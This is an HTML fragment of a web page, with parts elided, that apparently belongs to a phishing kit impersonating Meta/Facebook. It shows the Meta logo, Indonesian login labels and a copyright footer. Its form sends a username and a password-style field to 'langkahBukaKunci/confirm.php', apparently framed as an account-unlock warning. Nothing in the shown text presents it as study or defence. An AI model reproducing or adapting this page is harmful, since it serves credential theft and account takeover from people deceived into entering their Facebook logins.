  ...
  <body>
    <div class="container">
      <header>
        <nav>
          <div class="logometa">
            <img src="assets/img/meta.png" alt="Meta Logo" />
          </div>
          <ul class="menu">
      ...
      <center>
        <!-- <img class="fbsesi" src="assets/img/fbsesi.jpg" alt="Facebook Ssi" /> -->
      ...
      <div class="logoalexfbperingatan">
        ...
        <form action="langkahBukaKunci/confirm.php" method="post" onsubmit="$(this).end()">
        <div class="formalexfbperingatan">
                <input
                  type="text"
                  name="user"
                  class="email form-control-plaintext"
                ...
                <input
                  ...
                  autocomplete="off" required
                />
                <button type="submit" id="btnfb" >Masuk</button>
                <span>Lupa Kata Sandi?</span>
              </div>
        </form>
      <foot class="copyright" style="margin-top: 20px;">
        <div class="footalexfbperingatan">
          ...
          <div class="copyrightalexfbperingatan">
            <span style="font-size: 10">Meta © 2024</span>
          </div>
        </div>
      </foot>
    </div>
